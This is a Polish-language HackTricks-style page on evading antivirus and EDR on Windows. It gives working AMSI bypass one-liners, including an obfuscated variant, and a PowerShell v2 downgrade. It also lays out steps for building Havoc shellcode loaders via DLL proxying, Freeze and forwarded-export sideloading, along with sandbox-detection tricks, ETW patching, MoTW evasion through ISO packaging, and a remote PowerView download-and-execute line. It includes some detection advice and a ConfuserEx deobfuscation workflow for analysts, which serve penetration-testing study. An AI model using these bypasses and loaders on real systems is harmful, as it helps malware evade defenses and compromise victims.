# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Ta strona została napisana przez** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Narzędzie do zatrzymania działania Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Narzędzie do zatrzymania działania Windows Defender przez podszycie się pod inny AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

## **AV Evasion Methodology**

Obecnie AVs wykorzystują różne metody sprawdzania, czy plik jest złośliwy: static detection, dynamic analysis, oraz — w przypadku bardziej zaawansowanych EDRs — behavioural analysis.

### **Static detection**

Static detection polega na oznaczaniu znanych złośliwych ciągów znaków lub tablic bajtów w binarnym pliku lub skrypcie, a także na wyciąganiu informacji z samego pliku (np. file description, company name, digital signatures, icon, checksum itp.). Oznacza to, że używanie znanych publicznych narzędzi może sprawić, że zostaniesz szybciej wykryty, ponieważ prawdopodobnie zostały już przeanalizowane i oznaczone jako złośliwe. Istnieje kilka sposobów obejścia tego typu wykrywania:

- **Encryption**

Jeśli zaszyfrujesz binarkę, AV nie będzie w stanie wykryć twojego programu, ale będziesz potrzebował jakiegoś loadera, aby odszyfrować i uruchomić program w pamięci.

- **Obfuscation**

Czasami wystarczy zmienić kilka stringów w binarce lub skrypcie, aby obejść AV, ale może to być czasochłonne w zależności od tego, co próbujesz zaciemnić.

- **Custom tooling**

Jeśli opracujesz własne narzędzia, nie będzie znanych sygnatur, ale to wymaga dużo czasu i wysiłku.

> [!TIP]
> Dobrym sposobem sprawdzenia wykrywania statycznego przez Windows Defender jest [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Narzędzie dzieli plik na wiele segmentów i każdorazowo prosi Defender o przeskanowanie każdego z nich — w ten sposób możesz dokładnie zobaczyć, które stringi lub bajty w twojej binarce są oznaczane.

Gorąco polecam obejrzeć ten [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) o praktycznym AV Evasion.

### **Dynamic analysis**

Dynamic analysis zachodzi, gdy AV uruchamia twoją binarkę w sandboxie i obserwuje złośliwą aktywność (np. próby odszyfrowania i odczytu haseł z przeglądarki, wykonanie minidumpa na LSASS itp.). Ta część może być trudniejsza, ale oto kilka rzeczy, które możesz zrobić, aby ominąć sandboksy.

- **Sleep before execution** W zależności od implementacji może to być świetny sposób na ominięcie dynamic analysis AV. AV mają bardzo mało czasu na skanowanie plików, aby nie przerywać pracy użytkownika, więc użycie długich sleepów może zaburzyć analizę binarek. Problem w tym, że wiele sandboksów AV może po prostu pominąć sleep, w zależności od implementacji.
- **Checking machine's resources** Zazwyczaj sandboksy mają bardzo ograniczone zasoby (np. < 2GB RAM), żeby nie spowalniać maszyny użytkownika. Możesz też być kreatywny — np. sprawdzając temperaturę CPU lub prędkości wentylatorów; nie wszystko będzie zaimplementowane w sandboxie.
- **Machine-specific checks** Jeśli chcesz zaatakować użytkownika, którego stacja robocza jest dołączona do domeny "contoso.local", możesz sprawdzić domenę komputera i jeśli się nie zgadza — zakończyć działanie programu.

Okazuje się, że nazwa komputera sandboxa Microsoft Defender to HAL9TH, więc możesz sprawdzić nazwę komputera w swoim malware przed detonacją — jeśli nazwa to HAL9TH, oznacza to, że jesteś wewnątrz sandboxa Defendera i możesz zakończyć działanie programu.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Kilka innych naprawdę dobrych wskazówek od [@mgeeky](https://twitter.com/mariuszbit) dotyczących obchodzenia się z Sandboksami

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Jak wspomnieliśmy wcześniej, **public tools** w końcu **zostaną wykryte**, więc powinieneś zadać sobie pytanie:

Na przykład, jeśli chcesz zrzucić LSASS, **czy naprawdę musisz używać mimikatz**? Czy nie możesz użyć innego, mniej znanego projektu, który również zrzuca LSASS?

Prawidłowa odpowiedź to prawdopodobnie to drugie. Biorąc mimikatz jako przykład — prawdopodobnie jest to jedno z najbardziej wykrywanych narzędzi przez AVs i EDRs; projekt jest super, ale jednocześnie to koszmar przy próbach ominięcia AVs, więc po prostu poszukaj alternatyw dla tego, co chcesz osiągnąć.

> [!TIP]
> Przy modyfikowaniu payloadów w celu evasions, upewnij się, że wyłączyłeś automatyczne wysyłanie próbek w defender, i proszę — na serio, **NIE WGRYWAJ NA VIRUSTOTAL**, jeśli twoim celem jest długoterminowe osiągnięcie ominęcia wykryć. Jeśli chcesz sprawdzić, czy payload jest wykrywany przez konkretny AV, zainstaluj go na VM, spróbuj wyłączyć automatyczne wysyłanie próbek i testuj tam, aż będziesz zadowolony z rezultatu.

## EXEs vs DLLs

Kiedykolwiek to możliwe, zawsze **priorytetyzuj używanie DLLs do evasions** — z mojego doświadczenia pliki DLL są zwykle **znacznie mniej wykrywane** i analizowane, więc to prosta sztuczka, która w niektórych przypadkach pozwala uniknąć wykrycia (o ile twój payload ma sposób uruchomienia się jako DLL).

Jak widać na tym obrazku, DLL Payload z Havoc ma wynik wykrywalności 4/26 na antiscan.me, podczas gdy EXE ma 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Poniżej pokażemy kilka sztuczek, których możesz użyć z plikami DLL, aby być znacznie bardziej stealthy.

## DLL Sideloading & Proxying

**DLL Sideloading** wykorzystuje kolejność wyszukiwania DLL przez loadera, pozycjonując aplikację ofiary i złośliwy payload obok siebie.

Możesz sprawdzić programy podatne na DLL Sideloading za pomocą [Siofra](https://github.com/Cybereason/siofra) i następującego skryptu powershell:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Ta komenda wyświetli listę programów podatnych na DLL hijacking w "C:\Program Files\\" oraz plików DLL, które próbują załadować.

Gorąco polecam, abyś samodzielnie **zbadał programy DLL Hijackable/Sideloadable**, ta technika jest dość dyskretna, jeśli zostanie prawidłowo wykonana, ale jeśli użyjesz publicznie znanych DLL Sideloadable programs, możesz zostać łatwo wykryty.

Samo umieszczenie złośliwego pliku DLL o nazwie, którą program oczekuje załadować, nie uruchomi twojego payloadu, ponieważ program oczekuje określonych funkcji w tym DLL; aby rozwiązać ten problem, użyjemy innej techniki zwanej **DLL Proxying/Forwarding**.

**DLL Proxying** przekierowuje wywołania, które program wykonuje, z proxy (i złośliwego) DLL do oryginalnego DLL, zachowując funkcjonalność programu i pozwalając na obsługę wykonania twojego payloadu.

Będę korzystał z projektu [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) autorstwa [@flangvik](https://twitter.com/Flangvik/)

Oto kroki, które wykonałem:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Ostatnie polecenie da nam 2 pliki: szablon kodu źródłowego DLL oraz oryginalną DLL z zmienioną nazwą.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Zarówno nasz shellcode (zakodowany przy użyciu [SGN](https://github.com/EgeBalci/sgn)) jak i proxy DLL mają wskaźnik wykrywalności 0/26 w [antiscan.me](https://antiscan.me)! Nazwałbym to sukcesem.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> I **gorąco polecam** obejrzeć [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) o DLL Sideloading oraz także [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE), aby dowiedzieć się więcej o tym, co omawialiśmy bardziej szczegółowo.

### Abusing Forwarded Exports (ForwardSideLoading)

Moduły Windows PE mogą eksportować funkcje, które są w rzeczywistości "forwarderami": zamiast wskazywać na kod, wpis eksportu zawiera łańcuch ASCII w postaci `TargetDll.TargetFunc`. Gdy wywołujący rozwiąże eksport, loader Windows:

- Załaduje `TargetDll`, jeśli nie jest jeszcze załadowany
- Rozwiąże `TargetFunc` z niego

Kluczowe zachowania, które warto zrozumieć:
- Jeśli `TargetDll` jest KnownDLL, jest dostarczany z chronionej przestrzeni nazw KnownDLLs (np. ntdll, kernelbase, ole32).
- Jeśli `TargetDll` nie jest KnownDLL, stosowany jest normalny porządek wyszukiwania DLL, który obejmuje katalog modułu wykonującego rozwiązywanie przekierowania eksportu.

To umożliwia pośrednią prymitywę sideloading: znajdź podpisany DLL, który eksportuje funkcję forwardowaną do nazwy modułu niebędącej KnownDLL, następnie umieść obok tego podpisanego DLL atakujący kontrolowany DLL o dokładnie takiej samej nazwie, jak forwardowany moduł docelowy. Kiedy forwardowany eksport zostanie wywołany, loader rozwiąże forward i załaduje Twój DLL z tego samego katalogu, uruchamiając Twój DllMain.

Przykład zaobserwowany w Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` nie jest KnownDLL, więc jest rozwiązywany przy użyciu normalnej kolejności przeszukiwania.

PoC (copy-paste):
1) Skopiuj podpisany systemowy DLL do zapisywalnego folderu
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Upuść złośliwy `NCRYPTPROV.dll` w tym samym folderze. Wystarczy minimalny DllMain, aby uzyskać wykonanie kodu; nie musisz implementować funkcji forwardowanej, aby wywołać DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Wyzwól przekierowanie za pomocą podpisanego LOLBin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Observed behavior:
- rundll32 (signed) ładuje side-by-side `keyiso.dll` (signed)
- Podczas rozwiązywania `KeyIsoSetAuditingInterface`, loader podąża za forwardem do `NCRYPTPROV.SetAuditingInterface`
- Następnie loader ładuje `NCRYPTPROV.dll` z `C:\test` i wykonuje jego `DllMain`
- Jeśli `SetAuditingInterface` nie jest zaimplementowane, otrzymasz błąd "missing API" dopiero po tym, jak `DllMain` już się wykonał

Hunting tips:
- Skoncentruj się na forwarded exports, gdzie moduł docelowy nie jest KnownDLL. KnownDLLs są wymienione pod `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Możesz zenumerować forwarded exports za pomocą narzędzi takich jak:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Zobacz Windows 11 forwarder inventory, aby wyszukać kandydatów: https://hexacorn.com/d/apis_fwd.txt

Pomysły na wykrywanie/obronę:
- Monitoruj LOLBins (np. rundll32.exe) ładujące podpisane DLL z nie-systemowych ścieżek, a następnie ładujące non-KnownDLLs o tej samej nazwie bazowej z tego katalogu
- Generuj alert dla łańcuchów procesów/modułów takich jak: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` w ścieżkach zapisywalnych przez użytkownika
- Wymuś polityki integralności kodu (WDAC/AppLocker) i zabroń równoczesnego zapisu i wykonania w katalogach aplikacji

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Możesz użyć Freeze, aby załadować i wykonać swój shellcode w dyskretny sposób.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion to gra w kota i myszkę — to, co działa dzisiaj, może zostać wykryte jutro, więc nigdy nie polegaj tylko na jednym narzędziu; jeśli to możliwe, spróbuj łączyć kilka technik unikania wykrycia.

## AMSI (Anti-Malware Scan Interface)

AMSI zostało stworzone, aby zapobiegać "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Początkowo oprogramowanie antywirusowe było w stanie skanować jedynie pliki na dysku, więc jeśli udało się wykonać payloady bezpośrednio w pamięci, AV nie mogło nic z tym zrobić, ponieważ nie miało wystarczającej widoczności.

Funkcja AMSI jest zintegrowana z następującymi komponentami Windows.

- User Account Control, or UAC (podniesienie uprawnień EXE, COM, MSI, lub instalacji ActiveX)
- PowerShell (skrypty, użycie interaktywne i dynamiczna ewaluacja kodu)
- Windows Script Host (wscript.exe i cscript.exe)
- JavaScript i VBScript
- makra Office VBA

Pozwala to rozwiązaniom antywirusowym na analizę zachowania skryptów poprzez udostępnienie zawartości skryptu w formie niezaszyfrowanej i nieobfuskowanej.

Uruchomienie `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` spowoduje następujące ostrzeżenie w Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Zwróć uwagę, że poprzedza to `amsi:` a potem ścieżką do pliku wykonywalnego, z którego uruchomiono skrypt — w tym przypadku powershell.exe

Nie zapisaliśmy żadnego pliku na dysku, a mimo to zostaliśmy wykryci w pamięci z powodu AMSI.

Co więcej, począwszy od **.NET 4.8**, kod C# jest również poddawany AMSI. Ma to nawet wpływ na `Assembly.Load(byte[])` przy ładowaniu do pamięci. Dlatego zaleca się używanie starszych wersji .NET (np. 4.7.2 lub starszych) do wykonywania w pamięci, jeśli chcesz ominąć AMSI.

Istnieje kilka sposobów obejścia AMSI:

- **Obfuscation**

Ponieważ AMSI działa głównie w oparciu o wykrycia statyczne, modyfikowanie skryptów, które próbujesz załadować, może być dobrym sposobem na uniknięcie wykrycia.

Jednak AMSI ma zdolność do deobfuskacji skryptów nawet jeśli są one wielowarstwowo obfuskowane, więc obfuskacja może być złym wyborem w zależności od tego, jak zostanie wykonana. To sprawia, że ominięcie nie jest trywialne. Czasami jednak wystarczy zmienić kilka nazw zmiennych i wszystko będzie działać, więc zależy to od tego, jak bardzo coś zostało oznaczone.

- **AMSI Bypass**

Ponieważ AMSI jest implementowane poprzez załadowanie DLL do procesu powershell (a także cscript.exe, wscript.exe, itd.), możliwe jest jego manipulowanie nawet przy uruchomieniu jako nieuprzywilejowany użytkownik. Z powodu tej wady implementacyjnej badacze odkryli wiele sposobów na ominięcie skanowania AMSI.

**Forcing an Error**

Wymuszenie niepowodzenia inicjalizacji AMSI (`amsiInitFailed`) spowoduje, że dla bieżącego procesu nie zostanie uruchomione żadne skanowanie. Początkowo zostało to ujawnione przez [Matt Graeber](https://twitter.com/mattifestation) i Microsoft opracował sygnaturę, aby uniemożliwić szerokie wykorzystanie tej metody.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Wystarczyła jedna linia kodu powershell, aby uczynić AMSI nieużytecznym dla bieżącego procesu powershell. Ta linia została oczywiście wykryta przez samo AMSI, więc konieczna jest pewna modyfikacja, aby móc użyć tej techniki.

Oto zmodyfikowany AMSI bypass, który wziąłem z tego [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Pamiętaj, że to prawdopodobnie zostanie wykryte po opublikowaniu tego wpisu, więc nie powinieneś publikować żadnego kodu, jeśli planujesz pozostać niezauważony.

**Memory Patching**

Technika została początkowo odkryta przez [@RastaMouse](https://twitter.com/_RastaMouse/) i polega na znalezieniu adresu funkcji "AmsiScanBuffer" w amsi.dll (odpowiedzialnej za skanowanie danych dostarczonych przez użytkownika) oraz nadpisaniu jej instrukcjami zwracającymi kod E_INVALIDARG. W ten sposób wynik rzeczywistego skanu będzie równy 0, co jest interpretowane jako wynik czysty.

> [!TIP]
> Proszę przeczytać [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) w celu uzyskania bardziej szczegółowego wyjaśnienia.

Istnieje też wiele innych technik używanych do obejścia AMSI przy użyciu powershell — zobacz [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) i [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell), aby dowiedzieć się o nich więcej.

To narzędzie [**https://github.com/Flangvik/AMSI.fail**](https://github.com/Flangvik/AMSI.fail) również generuje skrypt do obejścia AMSI.

**Usuń wykrytą sygnaturę**

Możesz użyć narzędzia takiego jak **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** i **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)**, aby usunąć wykrytą sygnaturę AMSI z pamięci bieżącego procesu. Narzędzie działa poprzez skanowanie pamięci bieżącego procesu w poszukiwaniu sygnatury AMSI, a następnie nadpisuje ją instrukcjami NOP, efektywnie usuwając ją z pamięci.

**Produkty AV/EDR, które używają AMSI**

Listę produktów AV/EDR wykorzystujących AMSI znajdziesz w **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Użyj Powershell w wersji 2**
Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać swoje skrypty bez skanowania przez AMSI. Możesz to zrobić:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging to funkcja pozwalająca rejestrować wszystkie polecenia PowerShell uruchamiane na systemie. Może to być przydatne do audytu i rozwiązywania problemów, ale może też stanowić **problem dla atakujących chcących uniknąć wykrycia**.

Aby obejść PowerShell logging, możesz użyć następujących technik:

- **Disable PowerShell Transcription and Module Logging**: W tym celu możesz użyć narzędzia takiego jak [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs).
- **Use Powershell version 2**: Jeśli użyjesz PowerShell w wersji 2, AMSI nie zostanie załadowane, więc możesz uruchamiać skrypty bez skanowania przez AMSI. Możesz to zrobić: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Użyj [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) aby uruchomić PowerShell bez obron (to właśnie używa `powerpick` z Cobal Strike).


## Obfuskacja

> [!TIP]
> Kilka technik obfuskacji polega na szyfrowaniu danych, co zwiększa entropię pliku binarnego i ułatwia AVs i EDRs ich wykrycie. Zachowaj ostrożność i rozważ stosowanie szyfrowania tylko w określonych sekcjach kodu, które są wrażliwe lub muszą być ukryte.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Podczas analizy malware używającego ConfuserEx 2 (lub komercyjnych forków) często napotykasz kilka warstw ochrony, które blokują dekompilery i sandboksy. Poniższy workflow niezawodnie **przywraca niemal oryginalny IL**, który można potem zdekompilować do C# w narzędziach takich jak dnSpy lub ILSpy.

1.  Anti-tampering removal – ConfuserEx szyfruje każde *method body* i odszyfrowuje je w statycznym konstruktorze *module* (`<Module>.cctor`). To również modyfikuje sumę kontrolną PE, więc każda modyfikacja spowoduje awarię binarki. Użyj **AntiTamperKiller** aby zlokalizować zaszyfrowane tabele metadanych, odzyskać XOR keys i zapisać czysty assembly:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Wyjście zawiera 6 parametrów anti-tamper (`key0-key3`, `nameHash`, `internKey`) które mogą być przydatne przy budowaniu własnego unpackera.

2.  Symbol / control-flow recovery – podaj *clean* plik do **de4dot-cex** (fork de4dot świadomy ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flagi:
• `-p crx` – select the ConfuserEx 2 profile  
• de4dot cofnie control-flow flattening, przywróci oryginalne namespaces, klasy i nazwy zmiennych oraz odszyfruje stałe łańcuchy znaków.

3.  Proxy-call stripping – ConfuserEx zastępuje bezpośrednie wywołania metod lekkimi wrapperami (tzw. *proxy calls*), aby dodatkowo utrudnić dekompilację. Usuń je za pomocą **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Po tym kroku powinieneś zobaczyć normalne API .NET, takie jak `Convert.FromBase64String` czy `AES.Create()` zamiast nieprzejrzystych funkcji-wrappperów (`Class8.smethod_10`, …).

4.  Manual clean-up – uruchom wynikowy binarek w dnSpy, wyszukaj duże bloby Base64 lub użycie `RijndaelManaged`/`TripleDESCryptoServiceProvider`, aby zlokalizować *prawdziwy* payload. Często malware przechowuje go jako TLV-encoded tablicę bajtów zainicjalizowaną wewnątrz `<Module>.byte_0`.

Powyższy ciąg przywraca przepływ wykonania **bez** konieczności uruchamiania złośliwej próbki – przydatne przy pracy na offline'owej stacji roboczej.

> 🛈  ConfuserEx tworzy niestandardowy atrybut o nazwie `ConfusedByAttribute`, który można wykorzystać jako IOC do automatycznego triage próbek.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Celem tego projektu jest dostarczenie otwartoźródłowego forka [LLVM](http://www.llvm.org/) zestawu kompilacyjnego, zdolnego zapewnić zwiększone bezpieczeństwo oprogramowania poprzez [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) i tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstruje, jak użyć języka `C++11/14` do generowania, w czasie kompilacji, obfuscated code bez użycia jakichkolwiek zewnętrznych narzędzi i bez modyfikowania kompilatora.
- [**obfy**](https://github.com/fritzone/obfy): Dodaje warstwę obfuscated operations generowanych przez C++ template metaprogramming framework, co utrudni nieco życie osobie chcącej złamać aplikację.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz to x64 binary obfuscator, który potrafi obfuskować różne pliki PE, w tym: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame to prosty metamorphic code engine dla dowolnych plików wykonywalnych.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator to fine-grained code obfuscation framework dla języków wspieranych przez LLVM, wykorzystujący ROP (return-oriented programming). ROPfuscator obfuskowuje program na poziomie kodu asemblera, przekształcając zwykłe instrukcje w ROP chains, zakłócając naturalne pojmowanie normalnego przepływu sterowania.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt to .NET PE Crypter napisany w Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor potrafi przekonwertować istniejące EXE/DLL na shellcode, a następnie je załadować

## SmartScreen & MoTW

Być może widziałeś ten ekran podczas pobierania niektórych plików wykonywalnych z internetu i uruchamiania ich.

Microsoft Defender SmartScreen to mechanizm bezpieczeństwa mający na celu chronić użytkownika końcowego przed uruchamianiem potencjalnie złośliwych aplikacji.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen działa głównie na zasadzie reputacji, co oznacza, że rzadko pobierane aplikacje wywołają SmartScreen, ostrzegając i uniemożliwiając użytkownikowi końcowemu uruchomienie pliku (chociaż plik nadal można uruchomić, klikając More Info -> Run anyway).

**MoTW** (Mark of The Web) to [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) o nazwie Zone.Identifier, który jest automatycznie tworzony przy pobieraniu plików z internetu, wraz z URL, z którego został pobrany.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Sprawdzanie Zone.Identifier ADS dla pliku pobranego z internetu.</p></figcaption></figure>

> [!TIP]
> Ważne: pliki wykonywalne podpisane zaufanym certyfikatem podpisu **nie wywołają SmartScreen**.

Bardzo skutecznym sposobem zapobiegania oznaczaniu payloadów Mark of The Web jest zapakowanie ich w pewnego rodzaju kontener, np. ISO. Dzieje się tak, ponieważ Mark-of-the-Web (MOTW) **nie może** być stosowany na **woluminach nie-NTFS**.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) to narzędzie, które pakuje payloady do kontenerów wyjściowych, aby ominąć Mark-of-the-Web.

Przykład użycia:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Oto demo obejścia SmartScreen przez spakowanie payloadów wewnątrz plików ISO przy użyciu [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) to potężny mechanizm logowania w Windows, który pozwala aplikacjom i komponentom systemowym na **rejestrowanie zdarzeń**. Jednak może być również wykorzystywany przez produkty zabezpieczające do monitorowania i wykrywania złośliwej aktywności.

Podobnie jak w przypadku wyłączania (ominięcia) AMSI, możliwe jest również sprawienie, że funkcja **`EtwEventWrite`** procesu użytkownika zwróci natychmiast, nie logując żadnych zdarzeń. Osiąga się to przez zapatchowanie tej funkcji w pamięci tak, aby od razu zwracała, co efektywnie wyłącza logowanie ETW dla tego procesu.

Więcej informacji znajdziesz w **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

Ładowanie binarek C# do pamięci jest znane od dawna i nadal jest świetnym sposobem uruchamiania narzędzi post-exploitation bez wykrycia przez AV.

Ponieważ payload zostanie załadowany bezpośrednio do pamięci bez zapisu na dysk, będziemy musieli martwić się tylko o zapatchowanie AMSI dla całego procesu.

Większość frameworków C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) już umożliwia wykonywanie C# assemblies bezpośrednio w pamięci, ale istnieją różne sposoby, by to zrobić:

- **Fork\&Run**

Polega to na **spawning a new sacrificial process**, wstrzyknięciu do niego twojego złośliwego kodu post-exploitation, wykonaniu kodu, a po zakończeniu zabiciu tego procesu. Ma to swoje zalety i wady. Zaletą metody fork and run jest to, że wykonanie odbywa się **poza** naszym Beacon implant process. Oznacza to, że jeśli coś pójdzie nie tak lub zostanie wykryte podczas naszych działań post-exploitation, istnieje **znacznie większa szansa**, że nasz **implant przetrwa.** Wadą jest **większe ryzyko** wykrycia przez **Behavioural Detections**.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Chodzi o wstrzyknięcie złośliwego kodu post-exploitation **into its own process**. W ten sposób można uniknąć tworzenia nowego procesu i jego skanowania przez AV, ale wadą jest to, że jeśli coś pójdzie nie tak podczas wykonania payloadu, istnieje **znacznie większe ryzyko** **utracenia twojego beacon**, ponieważ proces może się zawiesić lub zcrashować.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
